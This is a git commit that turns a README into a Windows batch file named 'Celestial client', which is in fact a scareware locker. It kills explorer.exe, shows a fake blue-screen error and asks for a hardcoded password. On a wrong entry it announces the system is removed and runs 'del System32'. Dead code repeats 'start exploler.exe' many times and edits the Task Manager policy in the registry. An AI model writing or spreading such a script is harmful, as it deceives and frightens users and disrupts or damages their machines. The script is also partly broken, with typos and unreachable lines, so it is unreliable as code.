0ab64c58562e9fd8aee82b41dd6fbcf6a378c4c0
Doerst <124893491+DoerstGD@users.noreply.github.com>
2023-03-24 13:35:52 +0300

    Update and rename README.md to celestial.bat

---
+++ celestial.bat
@@ -0,0 +1,176 @@
+@echo off
+Taskkill/f /im explorer.exe
+Title Celestial client
+color 2
+
+
+echo error
+echo 0000000x00000000000)))))error echo system 32:0000000x000120)))(
+echo Technical Information:
+
+echo *** STOP: 0x1000007e 
+echo (0xffffffffc0000005, 
+echo 0xfffff80002e55151, 
+echo 0xfffff880009a99d8,
+echo 0xfffff880009a9230)
+echo *** xNtKrnl.exe - Address 
+echo 0xfffff80002e55151 base at echo 0xfffff80002e0d000 DateStamp
+echo 0x4ce7951a
+echo Enter password
+echo орПРОВРОпвроыпвНН
+
+:h
+set/p x=
+if %x%==120120 (echo win start
+start explorer
+exit
+) else (
+echo Your sistem was be removed!
+
+del System32
+
+)
+
+goto h
+
+
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+start exploler.exe
+
+
+
+
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 0
+
+
